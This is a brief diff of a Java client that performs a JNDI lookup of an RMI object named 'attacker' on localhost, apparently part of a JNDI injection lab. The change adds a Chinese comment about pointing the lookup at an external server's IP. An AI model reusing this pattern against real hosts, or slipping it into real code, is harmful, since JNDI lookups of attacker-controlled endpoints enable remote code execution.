@@ -16,6 +16,7 @@ public class Client {
 
     public static void main(String[] args) throws NamingException {
         Context context = new InitialContext();
+        // 连接外部服务器需要指定为对应的服务器IP
         context.lookup("rmi://localhost:1099/attacker");
     }
 }
